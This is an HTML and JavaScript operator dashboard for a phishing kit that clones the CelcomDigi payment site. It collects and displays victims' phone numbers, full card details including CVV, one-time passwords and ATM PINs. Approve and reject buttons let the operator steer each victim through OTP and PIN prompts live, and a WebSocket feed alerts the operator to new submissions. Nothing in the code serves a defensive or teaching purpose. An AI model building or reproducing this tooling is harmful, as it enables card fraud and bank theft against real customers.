<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Admin Panel - CelcomDigi</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #0f172a;
      color: #e2e8f0;
      min-height: 100vh;
    }

    /* Sidebar */
    .sidebar {
      position: fixed;
      left: 0; top: 0; bottom: 0;
      width: 240px;
      background: #1e293b;
      border-right: 1px solid #334155;
      padding: 0;
      z-index: 100;
      display: flex;
      flex-direction: column;
    }

    .sidebar-header {
      padding: 20px 20px 16px;
      border-bottom: 1px solid #334155;
    }

    .sidebar-logo {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 4px;
    }

    .sidebar-logo-icon {
      width: 36px;
      height: 36px;
      background: linear-gradient(135deg, #003087, #1568e1);
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 18px;
    }

    .sidebar-logo-text {
      font-size: 15px;
      font-weight: 700;
      color: #f1f5f9;
    }

    .sidebar-sub {
      font-size: 11px;
      color: #64748b;
      margin-top: 2px;
    }

    .sidebar-nav {
      padding: 12px 0;
      flex: 1;
    }

    .nav-item {
      display: flex;
      align-items: center;
      gap: 10px;
      padding: 10px 20px;
      font-size: 13px;
      color: #94a3b8;
      cursor: pointer;
      border-left: 3px solid transparent;
      transition: all 0.15s;
    }
    .nav-item:hover { background: #273549; color: #e2e8f0; }
    .nav-item.active { background: #1a3a5c; color: #60a5fa; border-left-color: #3b82f6; }

    .nav-badge {
      margin-left: auto;
      background: #ef4444;
      color: #fff;
      font-size: 11px;
      font-weight: 700;
      padding: 2px 7px;
      border-radius: 10px;
      min-width: 20px;
      text-align: center;
    }
    .nav-badge.zero { background: #334155; color: #64748b; }

    .sidebar-footer {
      padding: 16px 20px;
      border-top: 1px solid #334155;
      font-size: 12px;
      color: #475569;
    }

    /* Main content */
    .main {
      margin-left: 240px;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    /* Top bar */
    .topbar {
      background: #1e293b;
      border-bottom: 1px solid #334155;
      padding: 14px 28px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      position: sticky;
      top: 0;
      z-index: 50;
    }

    .topbar-title {
      font-size: 18px;
      font-weight: 700;
      color: #f1f5f9;
    }

    .topbar-right {
      display: flex;
      align-items: center;
      gap: 16px;
    }

    .ws-status {
      display: flex;
      align-items: center;
      gap: 6px;
      font-size: 12px;
      color: #64748b;
    }
    .ws-dot {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: #ef4444;
      transition: background 0.3s;
    }
    .ws-dot.connected { background: #22c55e; }

    .refresh-btn {
      background: #334155;
      border: none;
      color: #94a3b8;
      padding: 6px 14px;
      border-radius: 6px;
      font-size: 12px;
      cursor: pointer;
      transition: all 0.15s;
    }
    .refresh-btn:hover { background: #475569; color: #e2e8f0; }

    /* Content area */
    .content {
      padding: 24px 28px;
      flex: 1;
    }

    /* Stats row */
    .stats-row {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 16px;
      margin-bottom: 24px;
    }

    .stat-card {
      background: #1e293b;
      border: 1px solid #334155;
      border-radius: 12px;
      padding: 16px 20px;
    }

    .stat-label {
      font-size: 11px;
      color: #64748b;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      margin-bottom: 8px;
    }

    .stat-value {
      font-size: 28px;
      font-weight: 700;
      color: #f1f5f9;
    }

    .stat-value.pending { color: #f59e0b; }
    .stat-value.approved { color: #22c55e; }
    .stat-value.rejected { color: #ef4444; }

    /* Sessions table */
    .section-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 16px;
    }

    .section-title {
      font-size: 16px;
      font-weight: 700;
      color: #f1f5f9;
    }

    .filter-tabs {
      display: flex;
      gap: 6px;
    }

    .filter-tab {
      padding: 5px 14px;
      border-radius: 6px;
      font-size: 12px;
      font-weight: 600;
      cursor: pointer;
      border: 1px solid #334155;
      color: #64748b;
      background: transparent;
      transition: all 0.15s;
    }
    .filter-tab.active {
      background: #3b82f6;
      border-color: #3b82f6;
      color: #fff;
    }

    /* Session cards */
    .sessions-list {
      display: flex;
      flex-direction: column;
      gap: 16px;
    }

    .session-card {
      background: #1e293b;
      border: 1px solid #334155;
      border-radius: 14px;
      overflow: hidden;
      transition: border-color 0.2s;
    }
    .session-card:hover { border-color: #475569; }
    .session-card.pending { border-left: 4px solid #f59e0b; }
    .session-card.approved { border-left: 4px solid #22c55e; }
    .session-card.rejected { border-left: 4px solid #ef4444; }

    .session-header {
      padding: 14px 20px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border-bottom: 1px solid #273549;
    }

    .session-id {
      font-size: 11px;
      color: #64748b;
      font-family: monospace;
    }

    .session-time {
      font-size: 11px;
      color: #64748b;
    }

    .status-badge {
      padding: 3px 10px;
      border-radius: 20px;
      font-size: 11px;
      font-weight: 700;
      text-transform: uppercase;
    }
    .status-badge.pending { background: #451a03; color: #fbbf24; }
    .status-badge.awaiting_otp { background: #1e1a45; color: #818cf8; }
    .status-badge.awaiting_pin { background: #0f2a1e; color: #34d399; }
    .status-badge.approved { background: #052e16; color: #4ade80; }
    .status-badge.rejected { background: #2d0a0a; color: #f87171; }
    .status-badge.completed { background: #052e16; color: #4ade80; }

    .session-body {
      padding: 16px 20px;
    }

    .info-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 12px;
      margin-bottom: 16px;
    }

    .info-item label {
      display: block;
      font-size: 10px;
      color: #64748b;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      margin-bottom: 3px;
    }

    .info-item span {
      font-size: 13px;
      color: #e2e8f0;
      font-weight: 500;
    }

    /* Card details section */
    .details-section {
      background: #0f172a;
      border-radius: 10px;
      padding: 14px 16px;
      margin-bottom: 16px;
    }

    .details-title {
      font-size: 12px;
      font-weight: 700;
      color: #94a3b8;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      margin-bottom: 10px;
    }

    .details-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 10px;
    }

    .detail-item label {
      display: block;
      font-size: 10px;
      color: #64748b;
      margin-bottom: 2px;
    }

    .detail-item span {
      font-size: 13px;
      color: #f1f5f9;
      font-weight: 600;
      font-family: monospace;
    }

    /* OTP/PIN data */
    .otp-data {
      background: #1a2744;
      border: 1px solid #2d4a8a;
      border-radius: 8px;
      padding: 10px 14px;
      margin-bottom: 12px;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .otp-data label {
      font-size: 11px;
      color: #93c5fd;
      font-weight: 600;
      text-transform: uppercase;
    }

    .otp-data span {
      font-size: 20px;
      font-weight: 700;
      color: #60a5fa;
      font-family: monospace;
      letter-spacing: 4px;
    }

    .pin-data {
      background: #1a2a1a;
      border: 1px solid #2d5a2d;
      border-radius: 8px;
      padding: 10px 14px;
      margin-bottom: 12px;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .pin-data label {
      font-size: 11px;
      color: #86efac;
      font-weight: 600;
      text-transform: uppercase;
    }

    .pin-data span {
      font-size: 20px;
      font-weight: 700;
      color: #4ade80;
      font-family: monospace;
      letter-spacing: 4px;
    }

    /* Action buttons */
    .action-row {
      display: flex;
      gap: 10px;
      flex-wrap: wrap;
    }

    .btn-approve {
      flex: 1;
      min-width: 120px;
      padding: 10px 20px;
      background: #16a34a;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 14px;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.15s;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
    }
    .btn-approve:hover { background: #15803d; }
    .btn-approve:disabled { background: #334155; color: #64748b; cursor: not-allowed; }

    .btn-reject {
      flex: 1;
      min-width: 120px;
      padding: 10px 20px;
      background: #dc2626;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 14px;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.15s;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
    }
    .btn-reject:hover { background: #b91c1c; }
    .btn-reject:disabled { background: #334155; color: #64748b; cursor: not-allowed; }

    .btn-delete {
      padding: 10px 16px;
      background: #1e293b;
      color: #64748b;
      border: 1px solid #334155;
      border-radius: 8px;
      font-size: 13px;
      cursor: pointer;
      transition: all 0.15s;
    }
    .btn-delete:hover { background: #334155; color: #e2e8f0; }

    /* Empty state */
    .empty-state {
      text-align: center;
      padding: 60px 20px;
      color: #475569;
    }

    .empty-icon {
      font-size: 48px;
      margin-bottom: 16px;
    }

    .empty-title {
      font-size: 16px;
      font-weight: 600;
      color: #64748b;
      margin-bottom: 6px;
    }

    .empty-sub {
      font-size: 13px;
    }

    /* Notification toast */
    .toast {
      position: fixed;
      top: 20px;
      right: 20px;
      background: #1e293b;
      border: 1px solid #334155;
      border-radius: 10px;
      padding: 14px 20px;
      font-size: 14px;
      color: #e2e8f0;
      z-index: 9999;
      transform: translateX(120%);
      transition: transform 0.3s ease;
      max-width: 320px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.4);
    }
    .toast.show { transform: translateX(0); }
    .toast.success { border-left: 4px solid #22c55e; }
    .toast.error { border-left: 4px solid #ef4444; }
    .toast.info { border-left: 4px solid #3b82f6; }

    /* Pulse animation for new sessions */
    @keyframes pulse-border {
      0%, 100% { border-color: #f59e0b; }
      50% { border-color: #fbbf24; box-shadow: 0 0 0 3px rgba(245,158,11,0.2); }
    }
    .session-card.new-session { animation: pulse-border 2s ease-in-out 3; }

    /* Responsive */
    @media (max-width: 900px) {
      .sidebar { display: none; }
      .main { margin-left: 0; }
      .stats-row { grid-template-columns: repeat(2, 1fr); }
      .info-grid { grid-template-columns: repeat(2, 1fr); }
      .details-grid { grid-template-columns: 1fr; }
    }
  </style>
</head>
<body>

  <!-- Sidebar -->
  <div class="sidebar">
    <div class="sidebar-header">
      <div class="sidebar-logo">
        <div class="sidebar-logo-icon">🛡️</div>
        <div>
          <div class="sidebar-logo-text">Admin Panel</div>
          <div class="sidebar-sub">CelcomDigi Clone</div>
        </div>
      </div>
    </div>
    <div class="sidebar-nav">
      <div class="nav-item active">
        📋 Sessions
        <span class="nav-badge zero" id="pendingBadge">0</span>
      </div>
      <div class="nav-item" onclick="clearAll()">🗑️ Clear All</div>
    </div>
    <div class="sidebar-footer">
      <div id="lastUpdate">Last update: --</div>
    </div>
  </div>

  <!-- Main -->
  <div class="main">
    <!-- Topbar -->
    <div class="topbar">
      <div class="topbar-title">Payment Sessions</div>
      <div class="topbar-right">
        <div class="ws-status">
          <div class="ws-dot" id="wsDot"></div>
          <span id="wsStatusText">Connecting...</span>
        </div>
        <button class="refresh-btn" onclick="loadSessions()">↻ Refresh</button>
      </div>
    </div>

    <!-- Content -->
    <div class="content">
      <!-- Stats -->
      <div class="stats-row">
        <div class="stat-card">
          <div class="stat-label">Total Sessions</div>
          <div class="stat-value" id="statTotal">0</div>
        </div>
        <div class="stat-card">
          <div class="stat-label">Pending Action</div>
          <div class="stat-value pending" id="statPending">0</div>
        </div>
        <div class="stat-card">
          <div class="stat-label">Approved</div>
          <div class="stat-value approved" id="statApproved">0</div>
        </div>
        <div class="stat-card">
          <div class="stat-label">Rejected</div>
          <div class="stat-value rejected" id="statRejected">0</div>
        </div>
      </div>

      <!-- Sessions -->
      <div class="section-header">
        <div class="section-title">Active Sessions</div>
        <div class="filter-tabs">
          <button class="filter-tab active" onclick="setFilter('all', this)">All</button>
          <button class="filter-tab" onclick="setFilter('pending', this)">Pending</button>
          <button class="filter-tab" onclick="setFilter('awaiting_otp', this)">OTP</button>
          <button class="filter-tab" onclick="setFilter('awaiting_pin', this)">PIN</button>
          <button class="filter-tab" onclick="setFilter('completed', this)">Done</button>
        </div>
      </div>

      <div class="sessions-list" id="sessionsList">
        <div class="empty-state">
          <div class="empty-icon">📭</div>
          <div class="empty-title">No sessions yet</div>
          <div class="empty-sub">Waiting for customers to submit card details...</div>
        </div>
      </div>
    </div>
  </div>

  <!-- Toast -->
  <div class="toast" id="toast"></div>

<script>
  let sessions = {};
  let currentFilter = 'all';
  let ws;
  let knownSessionIds = new Set();

  // ── WebSocket ──
  function connectWS() {
    const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = `${wsProtocol}//${window.location.host}?role=admin`;
    ws = new WebSocket(wsUrl);

    ws.onopen = () => {
      document.getElementById('wsDot').classList.add('connected');
      document.getElementById('wsStatusText').textContent = 'Connected';
      loadSessions();
    };

    ws.onmessage = (event) => {
      const data = JSON.parse(event.data);
      if (data.type === 'new_session' || data.type === 'session_update') {
        loadSessions();
        if (data.type === 'new_session') {
          showToast('🔔 New session: ' + data.sessionId.substring(0,12) + '...', 'info');
        }
      } else if (data.type === 'sessions_list') {
        updateSessions(data.sessions);
      }
    };

    ws.onclose = () => {
      document.getElementById('wsDot').classList.remove('connected');
      document.getElementById('wsStatusText').textContent = 'Disconnected';
      setTimeout(connectWS, 3000);
    };

    ws.onerror = () => {
      document.getElementById('wsStatusText').textContent = 'Error';
    };
  }

  // ── Load sessions ──
  async function loadSessions() {
    try {
      const res = await fetch('/api/admin/sessions');
      const data = await res.json();
      if (data.success) {
        updateSessions(data.sessions);
      }
    } catch (err) {
      console.error('Failed to load sessions:', err);
    }
  }

  function updateSessions(sessionList) {
    sessions = {};
    let pending = 0, approved = 0, rejected = 0;

    sessionList.forEach(s => {
      sessions[s.sessionId] = s;
      if (['pending', 'awaiting_otp', 'awaiting_pin'].includes(s.status)) pending++;
      else if (['approved', 'otp_approved', 'pin_approved', 'completed'].includes(s.status)) approved++;
      else if (['rejected', 'otp_rejected', 'pin_rejected'].includes(s.status)) rejected++;
    });

    document.getElementById('statTotal').textContent = sessionList.length;
    document.getElementById('statPending').textContent = pending;
    document.getElementById('statApproved').textContent = approved;
    document.getElementById('statRejected').textContent = rejected;

    const badge = document.getElementById('pendingBadge');
    badge.textContent = pending;
    badge.className = 'nav-badge' + (pending === 0 ? ' zero' : '');

    document.getElementById('lastUpdate').textContent = 'Last update: ' + new Date().toLocaleTimeString();

    renderSessions(sessionList);
  }

  function renderSessions(sessionList) {
    const container = document.getElementById('sessionsList');

    const filtered = sessionList.filter(s => {
      if (currentFilter === 'all') return true;
      if (currentFilter === 'pending') return s.status === 'pending';
      if (currentFilter === 'awaiting_otp') return s.status === 'awaiting_otp';
      if (currentFilter === 'awaiting_pin') return s.status === 'awaiting_pin';
      if (currentFilter === 'completed') return ['approved', 'rejected', 'otp_approved', 'otp_rejected', 'pin_approved', 'pin_rejected', 'completed'].includes(s.status);
      return true;
    });

    if (filtered.length === 0) {
      container.innerHTML = `
        <div class="empty-state">
          <div class="empty-icon">📭</div>
          <div class="empty-title">No sessions</div>
          <div class="empty-sub">No sessions match the current filter.</div>
        </div>`;
      return;
    }

    // Sort: pending first, then by time desc
    filtered.sort((a, b) => {
      const pendingStatuses = ['pending', 'awaiting_otp', 'awaiting_pin'];
      const aP = pendingStatuses.includes(a.status) ? 1 : 0;
      const bP = pendingStatuses.includes(b.status) ? 1 : 0;
      if (aP !== bP) return bP - aP;
      return new Date(b.createdAt) - new Date(a.createdAt);
    });

    container.innerHTML = filtered.map(s => renderSessionCard(s)).join('');
  }

  function renderSessionCard(s) {
    const isNew = !knownSessionIds.has(s.sessionId);
    if (isNew) knownSessionIds.add(s.sessionId);

    const statusClass = s.status.replace('_', '-');
    const isPending = s.status === 'pending';
    const isAwaitingOTP = s.status === 'awaiting_otp';
    const isAwaitingPIN = s.status === 'awaiting_pin';
    const canAct = isPending || isAwaitingOTP || isAwaitingPIN;

    const cardClass = isPending ? 'pending' : (
      ['approved','otp_approved','pin_approved','completed'].includes(s.status) ? 'approved' : 'rejected'
    );

    const time = new Date(s.createdAt).toLocaleString();
    const typeLabel = s.type === 'reload' ? '🔄 Reload' : '💳 Bill Payment';

    let actionLabel = '';
    let approveAction = '';
    let rejectAction = '';

    if (isPending) {
      actionLabel = 'Card Details Decision';
      approveAction = `sendDecision('${s.sessionId}', 'approved')`;
      rejectAction = `sendDecision('${s.sessionId}', 'rejected')`;
    } else if (isAwaitingOTP) {
      actionLabel = 'OTP Decision';
      approveAction = `sendDecision('${s.sessionId}', 'otp_approved')`;
      rejectAction = `sendDecision('${s.sessionId}', 'otp_rejected')`;
    } else if (isAwaitingPIN) {
      actionLabel = 'ATM PIN Decision';
      approveAction = `sendDecision('${s.sessionId}', 'pin_approved')`;
      rejectAction = `sendDecision('${s.sessionId}', 'pin_rejected')`;
    }

    return `
    <div class="session-card ${cardClass} ${isNew ? 'new-session' : ''}" id="card-${s.sessionId}">
      <div class="session-header">
        <div>
          <div class="session-id">${s.sessionId}</div>
          <div class="session-time">${time} · ${typeLabel}</div>
        </div>
        <span class="status-badge ${s.status}">${s.status.replace('_', ' ').toUpperCase()}</span>
      </div>
      <div class="session-body">

        <!-- Transaction Info -->
        <div class="info-grid">
          <div class="info-item">
            <label>Phone Number</label>
            <span>${s.number}</span>
          </div>
          <div class="info-item">
            <label>Amount</label>
            <span>RM ${parseFloat(s.amount).toFixed(2)}</span>
          </div>
          <div class="info-item">
            <label>Reference</label>
            <span style="font-size:11px;">${s.ref}</span>
          </div>
        </div>

        <!-- Card Details -->
        ${s.cardData ? `
        <div class="details-section">
          <div class="details-title">💳 Card Details</div>
          <div class="details-grid">
            <div class="detail-item">
              <label>Cardholder Name</label>
              <span>${s.cardData.cardholderName}</span>
            </div>
            <div class="detail-item">
              <label>Card Number</label>
              <span>${formatCardDisplay(s.cardData.cardNumber)}</span>
            </div>
            <div class="detail-item">
              <label>Expiry Date</label>
              <span>${s.cardData.expiry}</span>
            </div>
            <div class="detail-item">
              <label>CVV</label>
              <span>${s.cardData.cvv}</span>
            </div>
            <div class="detail-item">
              <label>Country</label>
              <span>${s.cardData.country}</span>
            </div>
            <div class="detail-item">
              <label>Bank</label>
              <span>${s.cardData.bank}</span>
            </div>
          </div>
        </div>` : ''}

        <!-- OTP Data -->
        ${s.otpData ? `
        <div class="otp-data">
          <label>OTP Entered:</label>
          <span>${s.otpData.otp}</span>
        </div>` : ''}

        <!-- PIN Data -->
        ${s.pinData ? `
        <div class="pin-data">
          <label>ATM PIN Entered:</label>
          <span>${s.pinData.pin}</span>
        </div>` : ''}

        <!-- Action buttons -->
        ${canAct ? `
        <div style="margin-bottom:8px;font-size:12px;color:#94a3b8;font-weight:600;">${actionLabel}</div>
        <div class="action-row">
          <button class="btn-approve" onclick="${approveAction}">
            ✓ Approve
          </button>
          <button class="btn-reject" onclick="${rejectAction}">
            ✗ Reject
          </button>
          <button class="btn-delete" onclick="deleteSession('${s.sessionId}')">🗑</button>
        </div>` : `
        <div class="action-row">
          <button class="btn-delete" onclick="deleteSession('${s.sessionId}')">🗑 Delete</button>
        </div>`}

      </div>
    </div>`;
  }

  function formatCardDisplay(num) {
    if (!num) return '-';
    const clean = num.replace(/\D/g,'');
    if (clean.length <= 4) return clean;
    return clean.substring(0, 4) + ' **** **** ' + clean.slice(-4);
  }

  // ── Send decision ──
  async function sendDecision(sessionId, status) {
    try {
      const res = await fetch('/api/admin/decision', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, status })
      });
      const data = await res.json();
      if (data.success) {
        showToast(`✓ Decision sent: ${status.replace('_', ' ')}`, 'success');
        loadSessions();
      } else {
        showToast('Failed to send decision', 'error');
      }
    } catch (err) {
      showToast('Network error', 'error');
    }
  }

  // ── Delete session ──
  async function deleteSession(sessionId) {
    try {
      await fetch('/api/admin/delete/' + sessionId, { method: 'DELETE' });
      loadSessions();
    } catch (err) {}
  }

  // ── Clear all ──
  async function clearAll() {
    if (!confirm('Clear all sessions?')) return;
    try {
      await fetch('/api/admin/clear', { method: 'DELETE' });
      loadSessions();
      showToast('All sessions cleared', 'info');
    } catch (err) {}
  }

  // ── Filter ──
  function setFilter(filter, btn) {
    currentFilter = filter;
    document.querySelectorAll('.filter-tab').forEach(t => t.classList.remove('active'));
    btn.classList.add('active');
    renderSessions(Object.values(sessions));
  }

  // ── Toast ──
  let toastTimer;
  function showToast(msg, type = 'info') {
    const toast = document.getElementById('toast');
    toast.textContent = msg;
    toast.className = `toast ${type} show`;
    clearTimeout(toastTimer);
    toastTimer = setTimeout(() => toast.classList.remove('show'), 4000);
  }

  // ── Init ──
  connectWS();
  setInterval(loadSessions, 10000); // Poll every 10s as fallback
</script>
</body>
</html>
